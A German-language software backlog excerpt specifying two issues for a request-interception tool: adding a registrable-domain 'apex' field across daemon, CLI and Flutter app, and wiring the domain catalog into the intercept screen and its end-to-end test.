`v1::FlowSummary` trägt `string apex = 25`: die registrierbare Domäne des Hosts nach der Public Suffix List, als A-Label wie `authority.host`, leer wenn der Daemon sie nicht kennt. Der History-Pfad füllt sie aus der Spalte, der Live-Pfad aus der `DomainTable`. `humanitl flows list --json` und `flows show --json` zeigen sie, der Dart-`Flow` trägt sie, und beide Fakes beantworten `apex:` exakt so wie der Daemon. Die Warteschlange gruppiert auf dem gelieferten Feld statt auf einer Handtabelle, `psl.dart` entfällt, und das Regel-Ziel „Domäne" steht für jede gehaltene Anfrage ohne zweiten Aufruf zur Verfügung.

### Nicht-Ziel
Kein `catalog_id`, kein `popularity_rank`, kein ganzes `DomainInfo` in der Zeile: die Katalog-Karte bleibt an `FlowDetail` und `Received` (HUM-031). Keine neue Spalte und keine Änderung an Grammatik oder Semantik des Filters — `apex:v` bleibt `apex = ?`, exakt. Keine neue Spalte in der Tabelle von `flows list`, nur in `--json`. Kein Umbenennen von `tranco_rank` auf `popularity_rank` (eigener Chore, CONVENTIONS 4.13). Keine neuen ARB-Schlüssel; `interceptRefusedApexUnknown` bleibt stehen und behält seinen Zweck.

### Betroffene Pfade
- `proto/humanitl/v1/humanitl.proto` (ändern: `FlowSummary`, Feld 25)
- `proto/descriptor.binpb` (neu erzeugt über `cargo xtask proto` bzw. `scripts/gen-proto.sh`)
- `daemon/crates/ipc/src/convert.rs`: `recorded_summary_to_proto:1338`, `record_to_summary:725`, `received_summary:1069`, `matches_filter:1120`
- `daemon/crates/ipc/src/server.rs`: Aufrufer `:277`, `:336`; `DomainTable` hängt schon an `:107`, `domain_of:464` bleibt für `FlowDetail`
- `daemon/crates/ipc/src/fake/state.rs`: `summary():122` (`apex_of` dort schon in `domain():194`)
- `daemon/bin/humanitl/src/cmd/flows.rs`: `summary_json:548`, Tests ab `:652`
- `app/lib/core/ipc/generated/humanitl/v1/humanitl.pb*.dart` (neu erzeugt)
- `app/lib/core/domain/flow.dart:78` plus freezed-Regeneration
- `app/lib/core/ipc/convert.dart:196`
- `app/lib/core/ipc/fake_daemon_client.dart:1640` (geteilte Datei)
- `app/lib/features/intercept/psl.dart` (gelöscht), `app/test/features/intercept/psl_test.dart` (gelöscht)
- `app/lib/features/intercept/providers/held_groups.dart:184`, `providers/decision.dart:975-995`, `widgets/batch_modal.dart:97`
- Tests: `daemon/crates/ipc/tests/proto_roundtrip.rs`, `daemon/crates/ipc/tests/proto_contract.rs`, `daemon/bin/humanitld/tests/daemon_end_to_end.rs:308`, `app/test/core/ipc/convert_test.dart`, `app/test/features/intercept/held_groups_test.dart`
- `backlog/CONVENTIONS.md`: 4.3 um `FlowSummary.apex` ergänzen, 4.15 (`:628-637`) neu fassen

Nicht berührt: `daemon/crates/recorder/*` (Spalte und Filter stehen), `daemon/crates/catalog/*` (die Liste steht), `daemon/Cargo.toml`.

### Spezifikation

```proto
  // Die registrierbare Domain des Hosts nach der Public Suffix List, als
  // A-Label wie `authority.host`: `b.github.io` fuer `a.b.github.io`, denn
  // `github.io` steht im privaten Abschnitt der Liste und jede Unterdomain
  // darunter hat einen eigenen Betreiber.
  //
  // Leer heisst „der Daemon weiss es nicht": keine Antwort des Katalogs, ein
  // IP-Literal oder ein Name, der nur aus einem Suffix besteht. Leer heisst
  // nie „unbedenklich" und wird nie geraten; wer gruppiert, nimmt dann den
  // Host selbst. Derselbe Wert, den `apex:` im Filter vergleicht.
  string apex = 25;
```

Woher der Wert je Pfad kommt:

| Pfad | Quelle | leer, wenn |
|---|---|---|
| `ListFlows`, `GetFlow` aus der Aufzeichnung (`recorded_summary_to_proto`) | `RecordedSummary.apex`, Spalte `apex` | Spalte ist `NULL` |
| `Subscribe` und `ListFlows` der laufenden Sitzung (`record_to_summary`) | `DomainTable::get(flow)`, sonst `DomainTable::describe(host)` | kein Katalog, IP-Literal, unbekanntes Suffix |
| `Received`, bevor die Registry den Datensatz hat (`received_summary`) | dieselbe `DomainTable` | wie oben |
| `humanitld --fake` (`fake/state.rs::summary`) | `convert::apex_of`, dieselbe Quelle wie `domain()` derselben Nachricht | nie |

```rust
pub fn record_to_summary(record: &FlowRecord, domains: Option<&DomainTable>) -> v1::FlowSummary;
fn received_summary(
    id: FlowId,
    at: SystemTime,
    request: &HttpRequest,
    domains: Option<&DomainTable>,
) -> v1::FlowSummary;
```

Alle vier Aufrufer übergeben `self.domains.as_deref()`, auch die Passthrough-Prüfung in `server.rs:277`, die nur `.passthrough` liest: eine Zeile, zwei Formen wäre die nächste Abweichung.

`matches_filter` lernt den Schlüssel, den der Recorder schon kennt:

```rust
Some(("apex", value)) => summary.apex.eq_ignore_ascii_case(value),
```

CLI: `summary_json` bekommt `"apex": summary.apex` direkt nach `"authority"`, weil der Apex zum Ziel gehört. Unbekannt ist `""`, nie `null`, wie `origin_tool` und `error`.

Dart: `Flow` bekommt `@Default('') String apex` neben `authority`; `FlowSummaryToDomain.toDomain()` reicht `apex: apex` durch. Der Fake vergleicht exakt und trennt den Fall wieder von `host`:

```dart
      case 'apex':
        _rejectCmp(cmp, key, term);
        return (Flow flow) => flow.apex.toLowerCase() == lower;
```

Gruppierung: `apexOfHost(Flow flow) => flow.apex.isEmpty ? flow.host : flow.apex;`. Ein leerer Apex gruppiert also nicht, er steht für sich; der Kopf schreibt dann den Host wie bisher. `selectedApex` liest `selectedFlowProvider?.apex` statt `flowDetailProvider(id)`. `apexResolver` baut aus den Flows der Warteschlange die Zuordnung Host zu Apex und antwortet für jeden davon; unbekannter Host oder leerer Apex ergibt `''`, und `RefusalReason.apexUnknown` bleibt genau für diesen Fall stehen.

`backlog/CONVENTIONS.md` 4.15, Absatz „Die Tabelle in `psl.dart` ist ein Rat und wird nie zu einer Regel", wird ersetzt: Der Apex kommt aus dem Summary, das Restrisiko `com.pl` ist damit weg, der Rat entfällt. Das Modal für Entscheidungen über mehrere Hosts bleibt trotzdem, jetzt mit dem eigenen Grund — es listet die Hosts auf, und wer über mehrere entscheidet, soll sie lesen (4.13, „Freigeben nie leichter als Blocken"). Diese Begründung wird dort ausgeschrieben, damit später niemand die Regel mit dem weggefallenen Risiko streicht.

### Schritte
1. Proto-Feld 25 ergänzen, `cargo xtask proto`, `proto/descriptor.binpb` erneuern; `cargo test -p humanitl-ipc --test proto_contract` grün.
2. `recorded_summary_to_proto` aus `row.apex` füllen; Unit-Test grün, History-Pfad liefert den Wert.
3. `record_to_summary` und `received_summary` um `domains` erweitern, alle Aufrufer nachziehen, `fake/state.rs::summary` füllen; `cargo test -p humanitl-ipc` grün.
4. `matches_filter` um `apex` erweitern; Test, dass `apex:github.io` `a.b.github.io` nicht trifft.
5. `summary_json` erweitern, CLI-Tests nachziehen; `humanitl flows list --json` zeigt den Schlüssel.
6. Dart-Stubs neu erzeugen, `Flow.apex` plus `build_runner`, `convert.dart` durchreichen, Fake auf exakten Vergleich umstellen; `flutter test test/core/ipc/` grün.
7. `psl.dart` und seinen Test löschen, `held_groups.dart`, `decision.dart`, `batch_modal.dart` auf das Feld umstellen; `flutter test test/features/intercept/` grün.
8. `daemon_end_to_end.rs` um die Zusicherung beider Wege und den Neustart erweitern, `backlog/CONVENTIONS.md` 4.3 und 4.15 nachziehen, `make check`, danach `tools/verify-commit.sh`.

### Tests
- `convert::tests::recorded_summary_carries_the_apex`: `RecordedSummary { apex: Some("b.github.io"), .. }` ergibt `summary.apex == "b.github.io"`; `apex: None` ergibt `""`.
- `convert::tests::live_summary_apex_is_empty_without_catalog`: `record_to_summary(&record, None)` gibt `""`, nicht die letzten zwei Labels.
- `convert::tests::live_and_recorded_summary_agree_on_the_apex`: derselbe Flow über beide Funktionen, gleicher String.
- `convert::tests::filter_apex_is_exact`: `matches_filter` mit `apex:github.io` gegen eine Zeile mit `apex = "b.github.io"` ist `false`, mit `apex:b.github.io` `true`, Groß- und Kleinschreibung egal.
- `fake::state::tests::summary_and_domain_agree_on_the_apex`: `summary().apex == domain().apex`.
- `proto_roundtrip::flow_summary_carries_the_apex`: Feld überlebt Encode und Decode.
- `proto_contract`: Descriptor passt zu den `.proto`-Dateien, `FlowSummary` hat Feld 25 mit Namen `apex` und Typ `string`.
- `flows::tests::summary_json_carries_the_apex` und `summary_json_apex_is_empty_string_when_unknown` (kein `null`).
- `daemon_end_to_end`: Anfragen an `a.b.github.io` und `192.168.1.50`; `ListFlows` liefert `"b.github.io"` und `""`, `Subscribe` denselben Wert für dieselbe `flow_id`; nach Neustart des Daemons trägt die Zeile den Apex weiter; `ListFlows` mit `filter: "apex:b.github.io"` liefert genau die eine Zeile.
- `app/test/core/ipc/convert_test.dart`: `apex` kommt durch, fehlendes Feld ergibt `''`.
- `app/test/core/ipc/fake_daemon_client_test.dart`: `apex:github.io` null Zeilen, `apex:b.github.io` eine, `apex:>x` wird abgelehnt.
- `app/test/features/intercept/held_groups_test.dart`: `a.foo.com.pl` und `b.evil.com.pl` ergeben zwei Gruppen; `a.b.github.io` und `c.b.github.io` eine Gruppe `b.github.io`; zwei Flows mit leerem Apex und verschiedenen Hosts ergeben zwei Gruppen.

### Akzeptanzkriterien
- [ ] Nach je einer Anfrage an `a.b.github.io`, `api.github.com` und `192.168.1.50` zeigt `humanitl flows list --json` die drei Zeilen mit `"apex": "b.github.io"`, `"apex": "github.com"` und `"apex": ""`.
- [ ] `humanitl flows list --filter apex:b.github.io --json` liefert genau diese eine Zeile, `--filter apex:github.io` null Zeilen; der Wert im Filter und der Wert in der Zeile sind derselbe String.
- [ ] Derselbe Lauf, zwei Wege: `Subscribe` (`Received.summary.apex`) und `ListFlows` liefern für dieselbe `flow_id` denselben Wert, und nach einem Neustart des Daemons steht er weiter in der Zeile (e2e-Assertionen in `daemon_end_to_end.rs`).
- [ ] Kein Pfad des echten Daemons rät: `rg "apex_of" daemon/crates/ipc/src` trifft nur `fake/` und die Rückfall-Funktion `domain_of`, und `live_summary_apex_is_empty_without_catalog` ist grün.
- [ ] `rg "multiLabelSuffixes|registrableDomain" app/` trifft nichts; `app/lib/features/intercept/psl.dart` existiert nicht mehr.
- [ ] Warteschlange mit vier gehaltenen Anfragen an `a.foo.com.pl`, `b.evil.com.pl`, `a.b.github.io` und `c.b.github.io`: drei Gruppen, die letzten beiden zusammen unter `b.github.io`.
- [ ] Ohne vorherige Auswahl und ohne einen `GetFlow`-Aufruf ist das Ziel „Domäne" in der Aktionsleiste für jede gehaltene Anfrage mit nicht-leerem Apex wählbar und die Regelvorschau nennt `**.<apex>`; bei leerem Apex bleibt es ausgegraut und nennt beim Anklicken den Grund.
- [ ] `make check` grün, `proto/descriptor.binpb` im selben Commit erneuert, `tools/verify-commit.sh` vor dem Push grün.

### Fallstricke
- Feldnummer 25, sonst nichts umnummerieren. `proto/descriptor.binpb` gehört in denselben Commit: `proto_contract.rs` vergleicht Byte für Byte, und ein Arbeitsbaum mit erneuertem Descriptor ist grün, während derselbe Commit auf `main` rot ist.
- `convert::apex_of` bleibt der Rückfall des Fakes und füllt im echten Daemon nichts. Er nimmt die letzten zwei Labels, macht aus `a.b.github.io` also `github.io` und legt zwei fremde Registranten unter einen Namen; und für ein IP-Literal gibt er die Adresse zurück, wo `catalog::psl::apex` `None` sagt. Beide Antworten dürfen in derselben Nachricht nicht nebeneinander stehen.
- Ein leerer Apex ist keine Einladung zum Raten. Die Gruppierung nimmt dann den Host, der Kopf schreibt den Host, und niemand ergänzt „unbekannt" durch eine Ableitung; genau das verbietet CONVENTIONS 4.13.
- `apex` ist das A-Label wie `authority.host`, nie die Anzeigeform. Die Spalte hält das A-Label, und der Filter vergleicht dagegen; eine Anzeigeform im Feld würde bei internationalisierten Namen dazu führen, dass man nach dem filtert, was man sieht, und nichts findet.
- Geteilte Dateien: `app/lib/core/ipc/fake_daemon_client.dart` und `app/lib/core/domain/flow.dart` berühren mehrere Issues. Nur den eigenen Abschnitt ändern, die Datei unmittelbar vor jedem Schreiben neu einlesen, nie im Ganzen neu schreiben.
- Die Szenarien des `FakeDaemonClient` müssen `apex` setzen. Sonst zerfällt die Warteschlange dort in eine Gruppe je Host, und die Tests von `held_groups_test.dart` verschieben sich, ohne dass am Produkt etwas kaputt wäre — ein Fehlalarm, der viel Zeit kostet.
- `record_to_summary` bekommt einen zweiten Parameter; jeder Aufrufer übergibt die Tabelle. Ein Aufrufer mit `None` erzeugt still eine zweite Form derselben Zeile, und die fällt erst auf, wenn ein Client zwei Antworten auf dieselbe Frage sieht.

### Referenzen
BACKLOG.md 3.3; `backlog/sprint-2.md` HUM-026 (Filter-Grammatik, „`FlowSummary` enthält alle Spalten von `flows`"), HUM-031; `backlog/CONVENTIONS.md` 4.3, 4.13, 4.15; ADR-006 (gebündelte Daten, kein Fetch zur Laufzeit); ADR-018; Public Suffix List (https://publicsuffix.org/).

---

## HUM-094 · Katalogname und Editor fehlen dem M2-Demolauf
Sprint: 2 · Größe: L · Abhängigkeiten: HUM-029, HUM-031 (Daemon-Hälfte gemerged), HUM-036 (Daemon-Hälfte gemerged) · Blockiert: Sprint-3-Merges (Sprint-Gate, geerbt von HUM-036)

### Kontext
`BACKLOG.md:459` verspricht für M2 die Katalog-Karte, `BACKLOG.md:457` für die Warteschlange eine „Summary-Zeile mit Katalog-Identität", und `backlog/sprint-2.md:1660` schreibt die Behauptung aus, an der das gemessen werden soll: „npm-Gruppe eingeklappt, Summary „Looks like: npm install", `0 findings`". Die Daten dafür liegen im Repository und reisen bereits über die Leitung. Die Daemon-Hälfte von HUM-031 ist gemerged (`4790c4a merge: HUM-031 catalog`), `catalog/domains.yaml` trägt die Einträge samt `name` und `typical`, `catalog_id` steht im Proto und wird in `app/lib/core/ipc/convert.dart:184-188` nach `DomainInfo` übersetzt.

Auf dem Bildschirm kommt davon nichts an. `DomainInfo` in `app/lib/core/domain/flow.dart:58-72` trägt `apex`, `catalogId`, `trancoRank`, `firstSeen`, `seenCount` und keinen Namen; einen Typ `CatalogEntry` gibt es in `app/` nicht. `interceptGroupLooksLike` hat null Treffer in `app/l10n/` und `app/lib/`; vorhanden ist nur `interceptGroupSummary` (`app/l10n/app_en.arb:801`, `app/l10n/app_de.arb:315`), dessen Format keine Katalogzeile kennt. `app/lib/features/intercept/widgets/group_header_row.dart:145-151` benennt jede Gruppe über `group.display`, also über einen Host. `app/lib/features/intercept/intercept_screen.dart:36` und `:476` zeigen rechts weiterhin `DomainPanePlaceholder`; `domain_panel.dart`, `catalog_card.dart`, `unknown_domain_card.dart` und `providers/catalog.dart` gibt es nicht, `app/assets/` gibt es nicht, `app/pubspec.yaml:73-76` hat weder einen `assets:`-Block noch eine YAML-Abhängigkeit.

Das ist kein offenes Feature, sondern eine Zusage, die heute unwahr ist. HUM-031 begründet den Katalog als „De-Panicker": erkannter Dienst plus null Findings heißt „sicher zu batchen". Genau diese Begründung trägt den Stapel-Allow über zwölf Anfragen, den die Warteschlange anbietet — nur steht dort statt des erkannten Dienstes ein Hostname, den `app/lib/features/intercept/psl.dart` geraten hat. Dieses Repository behauptet nie mehr, als belegt ist; ein Schlüssel, der dokumentiert ist und nicht wirkt, ist ein Bruch und kein Rückstand. `backlog/CONVENTIONS.md:672` hält das Fehlen ausdrücklich als Übergang fest („bis HUM-031 den Katalog liefert"). HUM-031 hat geliefert, der Übergang ist abgelaufen, der Satz stimmt nicht mehr.

Die zweite Hälfte des Titels ist eine Zusage in `BACKLOG.md:395`: M2 liefert „Allow/Edit/Block". `Edit + Allow` hat kein Control (`app/lib/features/intercept/widgets/action_bar.dart:385-388`), die ARB-Strings liegen ungenutzt bereit (`app/l10n/app_en.arb:233-234`), und der Request-Editor ist HUM-047 in Sprint 4. Behoben wird das durch eine Korrektur an dieser einen Zeile, nicht durch Code: `Edit + Allow` ist keine Zusicherung von HUM-036. Der ganze Abschnitt `backlog/sprint-2.md:1605-1695` hat null Treffer für „edit" oder „Edit", und keiner der Schritte 1 bis 8 (`:1659-1667`) bearbeitet je einen Request. HUM-047 blockiert M2 nicht.

Zwei Dinge werden dabei ausdrücklich nicht behauptet. Erstens steht `M2_EXPECTED_ASSERTIONS=47` in `tests/e2e/m2_first_decision/run.sh:76` nicht wegen dieser Lücken niedriger: der Kommentar `:71-75` definiert die Zahl als „So viele Behauptungen prüft ein vollständiger Lauf ohne die Oberfläche", und die Oberflächen-Hälfte fällt aus genau einem Grund aus, nämlich weil `app/integration_test/m2_first_decision_test.dart` fehlt (`run.sh:518-520`). Der fehlende Katalogname ist eine unter vielen ungeprüften Sachen, nicht die Ursache der Zahl. Zweitens ist der Katalog nicht ungeprüft: `run.sh:321-329` vergleicht die Apex-Spalte, die der Katalog beim Eintreffen füllt, gegen die Zählung nach Host, zwölf gegen zwölf. Ungeprüft ist der Name.

### Ziel
Das rechte Pane des Intercept-Bildschirms zeigt für eine Anfrage an `registry.npmjs.org` die Katalog-Karte mit „npm registry", Kategorie-Chip, Beschreibung, „Typical for: npm install", Rang-Badge und Schnellregeln; für `evil.example` die gestrichelte Unbekannt-Karte; ohne Auswahl die Sitzungs-Zusammenfassung. Der Kopf einer Gruppe, deren gehaltene Anfragen alle dieselbe `catalog_id` vom Daemon tragen, nennt den Dienst statt eines Hosts, und dieselbe Zeile steht in der Auswahl-Karte. `tests/e2e/m2_first_decision/run.sh` überspringt Schritt 10 nicht mehr, sondern fährt `app/integration_test/m2_first_decision_test.dart` unter `xvfb-run`, prüft den HAR-Export und prüft, dass auf dem Bildschirm der Dienstname und nicht der Host stand. `BACKLOG.md:395` verspricht für M2 nur noch, was M2 liefert.

### Nicht-Ziel
Kein Request-Editor. `Edit + Allow` bleibt bis HUM-047 (Sprint 4) ohne Control, und die Karte zeigt den Body weiter nur lesend; hier fällt allein die falsche Zusage in `BACKLOG.md:395`. Kein Live-Fetch von Favicon oder Vorschau, keine Screenshots, keine Nutzer-Kataloge (M9, M7, wie in HUM-031). Keine neuen Einträge in `catalog/domains.yaml` über die vorhandenen hinaus (HUM-059). Kein Umbenennen von `tranco_rank` nach `popularity_rank` (eigener Chore, siehe HUM-031 Kontext). Nicht der zu weit gefasste Satz in `CONTRIBUTING.md:46-47` („a run that skipped a branch fails instead of reporting success"); der M2-Lauf überspringt heute den Bildschirm-Zweig und endet trotzdem mit 0, meldet das aber laut und bricht mit `M2_UI=1` ab, also ist dort kein Loch, sondern ein zu weiter Satz — eigenes Issue.

### Betroffene Pfade
- `app/lib/core/domain/catalog.dart` (neu): `CatalogEntry`
- `app/lib/features/intercept/providers/catalog.dart`, `catalog.g.dart` (neu)
- `app/lib/features/intercept/widgets/domain_panel.dart`, `catalog_card.dart`, `unknown_domain_card.dart` (neu)
- `app/assets/catalog/domains.yaml` (neu, erzeugte Kopie von `catalog/domains.yaml`)
- `app/integration_test/m2_first_decision_test.dart` (neu)
- `app/test/features/intercept/catalog_test.dart`, `domain_panel_test.dart` (neu); Goldens unter `app/test/goldens/`
- `app/lib/features/intercept/intercept_screen.dart` (ändern: Import Zeile 36, Verwendung Zeile 476)
- `app/lib/features/intercept/widgets/domain_pane_placeholder.dart` (entfällt)
- `app/lib/features/intercept/providers/held_groups.dart` (ändern: Zeilen 56, 168, 184)
- `app/lib/features/intercept/widgets/group_header_row.dart` (ändern: Zeilen 145-151)
- `app/lib/features/intercept/widgets/selection_card.dart` (ändern: Zeile 51)
- `app/lib/features/intercept/psl.dart` (ändern: nur noch Rückfall, siehe Spezifikation)
- `app/l10n/app_en.arb`, `app/l10n/app_de.arb` (ändern: neue Schlüssel ans Ende des eigenen Abschnitts)
- `app/pubspec.yaml` (ändern: `yaml` in `dependencies`, `assets:`-Block unter `flutter:`)
- `Makefile` (ändern: Ziele `catalog-assets` und `catalog-lint`)
- `tests/e2e/m2_first_decision/run.sh` (ändern: Zeile 76, Schritt 10 Zeilen 516-559)
- `backlog/CONVENTIONS.md` (ändern: 4.15 Zeilen 669-673, 4.22 Zeilen 1251-1258)
- `BACKLOG.md` (ändern: Zeile 395)

`.github/workflows/ci.yml` bleibt unberührt: der Job `e2e-xvfb` (Zeilen 516-569) installiert `xvfb`, richtet Flutter ein und lädt `target/e2e` hoch; nachgeprüft, keine Änderung nötig.

### Spezifikation

Der Katalog-Eintrag in Dart. Beschreibung und `typical` kommen aus der YAML, nicht aus ARB; `description` ist dort eine Abbildung `en`/`de`.

```dart
// app/lib/core/domain/catalog.dart
@freezed
abstract class CatalogEntry with _$CatalogEntry {
  const factory CatalogEntry({
    required String id,
    required String name,
    required String category, // registry | scm | docs | ci | cloud | ai | cdn | search | os | other
    @Default(<String, String>{}) Map<String, String> description,
    @Default(<String>[]) List<String> typical,
    @Default('') String icon,
    @Default('') String homepage,
    @Default('') String riskNote,
  }) = _CatalogEntry;

  const CatalogEntry._();

  /// The description in [languageCode], falling back to English.
  String descriptionFor(String languageCode) =>
      description[languageCode] ?? description['en'] ?? '';

  /// The first entry of `typical`, or an empty string.
  String get firstTypical => typical.isEmpty ? '' : typical.first;
}
```

Der Provider heißt `catalogProvider` (`backlog/CONVENTIONS.md` Abschnitt 3, Provider-Namen); HUM-031 Schritt 4 schreibt `catalog_provider.dart`, die kanonische Liste gewinnt.

```dart
// app/lib/features/intercept/providers/catalog.dart
@riverpod
Future<Map<String, CatalogEntry>> catalog(Ref ref);          // catalogId -> Eintrag, aus dem Asset
@riverpod
CatalogEntry? catalogEntry(Ref ref, String catalogId);       // null, solange das Asset lädt oder die Kennung fehlt
```

`app/assets/catalog/domains.yaml` ist eine erzeugte, committete Kopie, nie von Hand gepflegt. `Makefile`:

```make
catalog-assets: ## Copy the domain catalog into the Flutter asset bundle
	install -D -m 0644 catalog/domains.yaml app/assets/catalog/domains.yaml

catalog-lint: ## The bundled catalog matches the source byte for byte
	@cmp -s catalog/domains.yaml app/assets/catalog/domains.yaml || \
	  { echo "app/assets/catalog/domains.yaml differs from catalog/domains.yaml; run make catalog-assets"; exit 1; }
```

`catalog-lint` hängt an `check`, `catalog-assets` an `flutter-codegen`.

Gruppierung. `DomainInfo.apex` kommt vom Daemon und wird bevorzugt; `registrableDomain` aus `psl.dart` bleibt Rückfall für Flows ohne `DomainInfo` (Fake-Szenarien, ältere Ereignisse).

```dart
// held_groups.dart
String apexOfHost(Flow flow) => flow.domain.apex.isNotEmpty
    ? flow.domain.apex
    : registrableDomain(flow.host, isIpLiteral: flow.authority.isIpLiteral);
```

`HeldGroup` bekommt zwei Felder:

```dart
/// The catalog id every held flow of the group carries, or an empty string.
final String catalogId;

/// True when every held flow got its apex from the daemon, not from `psl.dart`.
final bool apexFromDaemon;
```

Kopf und Auswahl-Karte:

```dart
String groupTitle(HeldGroup group, CatalogEntry? entry, AppLocalizations l10n) =>
    entry != null
    ? entry.name
    : group.display.isNotEmpty
    ? group.display
    : l10n.interceptGroupHosts(group.hosts.first, group.hosts.length - 1);
```

Die Summary-Zeile bekommt einen Platzhalter mehr. Vorhanden ist `interceptGroupSummary` mit `{name} · {count} · {methods} · {findings}`; die Katalogzeile tritt zwischen `name` und `count` und bleibt leer, wenn kein Eintrag gilt. Neue ARB-Schlüssel, camelCase wie im ganzen `app/l10n/` (HUM-031 notiert sie in snake_case; die Datei gewinnt), ans Ende des eigenen Abschnitts angehängt:

- `interceptGroupLooksLike`: `"Looks like: {typical}"` / `"Sieht aus wie: {typical}"`
- `catalogCategoryRegistry`, `catalogCategoryScm`, `catalogCategoryDocs`, `catalogCategoryCi`, `catalogCategoryCloud`, `catalogCategoryAi`, `catalogCategoryCdn`, `catalogCategorySearch`, `catalogCategoryOs`, `catalogCategoryOther`
- `domainUnknown`: `"Not in catalog"`, `domainPreviewDisabled`, `domainTypicalFor`, `domainFirstSeenNow`, `domainSeenCount`, `domainRank` (`"#{rank}"`), `domainRankUnranked` (`"unranked"`), `domainIpAddress`, `domainSessionHosts`

Rang-Format wie in HUM-031: unter 1000 exakt, darüber `1.2k`, ohne Rang `unranked`. Für IP-Hosts steht `domainIpAddress` statt eines Apex.

`DomainPanel` hat drei Zustände: Katalog-Karte, Unbekannt-Karte, Sitzungs-Zusammenfassung ohne Auswahl (Anzahl Hosts, Top 5 nach Requests). Aufbau der Karten wie in HUM-031 spezifiziert; die Schnellregeln rufen `Rules(add)`, nie `Decide`.

`run.sh` Schritt 10. Der Zweig für die fehlende Datei wird zum harten Fehler, weil die Datei ab jetzt im Repository liegt:

```sh
if [ "${M2_UI:-auto}" = 0 ]; then
    e2e_say "M2_UI=0: the screen half is switched off for this run"
elif [ ! -f "$M2_UI_TEST" ]; then
    e2e_die "$M2_UI_TEST is missing from the repository"
else
    ...
fi
```

Der Bildschirm-Test schreibt die Summary-Zeile der npm-Gruppe nach `$HUMANITL_E2E_GROUP_SUMMARY` (neue Env-Variable neben `HUMANITL_E2E_HAR`), damit die Prüfung des Namens im zählenden Skript liegt und nicht nur in Dart:

```sh
e2e_check "the screen names the service, not the host" \
    "$(grep -q 'npm registry' "$M2_GROUP_SUMMARY" && echo ok)"
e2e_check "and says what the group looks like" \
    "$(grep -q 'Looks like: npm install' "$M2_GROUP_SUMMARY" && echo ok)"
```

Schritt 10 zählt damit vier Behauptungen mit (HAR geschrieben, HAR-Einträge, Name, Katalogzeile). `M2_EXPECTED_ASSERTIONS` in Zeile 76 steigt auf die Zahl, die der Lauf meldet, mindestens 51.

`backlog/CONVENTIONS.md`: In 4.15 fällt der letzte Satz des Absatzes zu `Edit + Allow` weg (Zeilen 672-673, „Aus demselben Grund fehlen der Katalogname … bis HUM-031 den Katalog liefert."); der Satz zu `Edit + Allow` selbst bleibt, bis HUM-047 ihn einlöst. Der Absatz bei Zeile 637 wird umgeschrieben: der Rat aus `psl.dart` entfällt für Gruppen mit Daemon-Apex, samt der Sonderregel des Gruppen-Modals, und bleibt für alle anderen. In 4.22 fällt der Satz weg, der die Oberflächen-Hälfte als ausstehend führt (Zeilen 1253-1258).

`BACKLOG.md:395`: „Allow/Edit/Block" wird zu „Allow/Block (Editor ab M4, HUM-047)".

### Schritte
1. `Makefile`-Ziele `catalog-assets` und `catalog-lint`, `assets:`-Block und `yaml`-Abhängigkeit in `app/pubspec.yaml`, Kopie erzeugen und committen. Prüfbar: `make catalog-assets && make catalog-lint` endet 0, nach einer Änderung an einer der beiden Dateien endet `make catalog-lint` mit 1.
2. `CatalogEntry` und `catalogProvider`. Prüfbar: `flutter test test/features/intercept/catalog_test.dart` grün, der Test liest das echte Asset und findet `npm` mit Name „npm registry".
3. `DomainPanel` mit den drei Zuständen, `catalog_card.dart`, `unknown_domain_card.dart`, Schnellregeln, Goldens. `intercept_screen.dart` umhängen, `domain_pane_placeholder.dart` löschen. Prüfbar: `grep -rn DomainPanePlaceholder app/lib app/test` leer, `make flutter-test` grün.
4. Gruppierung auf den Apex des Daemons umstellen, `HeldGroup.catalogId` und `apexFromDaemon`, Kopf und Auswahl-Karte, ARB-Schlüssel, Sonderregel des Gruppen-Modals nur noch für Gruppen ohne Daemon-Apex. Prüfbar: `make flutter-analyze flutter-test` grün.
5. `app/integration_test/m2_first_decision_test.dart` nach den acht Schritten aus `backlog/sprint-2.md:1659-1667`, schreibt HAR und Summary-Zeile in die Pfade aus der Umgebung. Prüfbar: `xvfb-run -a flutter test integration_test/m2_first_decision_test.dart -d linux` gegen einen von Hand gestarteten Lauf grün.
6. `run.sh` Schritt 10 und Zeile 76. Prüfbar: `M2_UI=1 tests/e2e/m2_first_decision/run.sh` endet 0, ohne `SKIPPED:`-Zeile und ohne `raise M2_EXPECTED_ASSERTIONS`.
7. `backlog/CONVENTIONS.md` 4.15 und 4.22 sowie `BACKLOG.md:395` nachziehen. Prüfbar: `make check` grün.

### Tests
- `catalog_parses_bundled_asset`: `catalogProvider` liefert mindestens 25 Einträge; `npm` hat Name „npm registry", Kategorie `registry`, `typical.first == "npm install"`.
- `catalog_description_falls_back_to_en`: Eintrag ohne `de`-Beschreibung, `descriptionFor('de')` liefert die englische.
- `catalog_entry_unknown_id_is_null`: `catalogEntryProvider('nope')` liefert `null`, kein Wurf.
- `domain_panel_known` (Golden): Flow auf `registry.npmjs.org` mit `catalogId: npm`; Karte zeigt Name, Kategorie-Chip, Beschreibung, „Typical for: npm install", Rang-Badge.
- `domain_panel_unknown` (Golden): Flow auf `evil.example` ohne `catalogId`; gestrichelte Karte, „Not in catalog", Vorschau-Knopf deaktiviert mit Tooltip.
- `domain_panel_session_summary` (Golden): keine Auswahl; Anzahl Hosts und Top 5.
- `quick_rule_calls_rules_add`: Klick auf `Allow **.npmjs.org this session` ruft `Rules(add)` mit genau dieser Regel und nie `Decide`.
- `group_title_uses_catalog_name`: alle gehaltenen Flows mit `catalogId: npm` ⇒ Kopf sagt „npm registry".
- `group_title_keeps_host_when_catalog_ids_differ`: zwei Flows, verschiedene `catalogId` ⇒ Kopf sagt weiter „Host und n weitere".
- `group_modal_still_asks_without_daemon_apex`: Gruppe, deren Flows keinen `DomainInfo.apex` tragen ⇒ das Modal erscheint wie bisher.
- e2e: Schritt 10 von `tests/e2e/m2_first_decision/run.sh`, vier gezählte Behauptungen.

### Akzeptanzkriterien
- [ ] `grep -rn 'DomainPanePlaceholder' app/lib app/test` liefert null Treffer, und `app/lib/features/intercept/widgets/domain_pane_placeholder.dart` existiert nicht mehr.
- [ ] `grep -n 'interceptGroupLooksLike' app/l10n/app_en.arb app/l10n/app_de.arb` liefert je einen Treffer, `make flutter-codegen` läuft ohne Warnung, und `grep -rn 'interceptGroupLooksLike' app/lib` liefert mindestens den Treffer in `group_header_row.dart`.
- [ ] `make flutter-test` grün, inklusive der drei Goldens `domain_panel_known`, `domain_panel_unknown`, `domain_panel_session_summary` und der Tests `quick_rule_calls_rules_add`, `group_title_uses_catalog_name`, `group_title_keeps_host_when_catalog_ids_differ`.
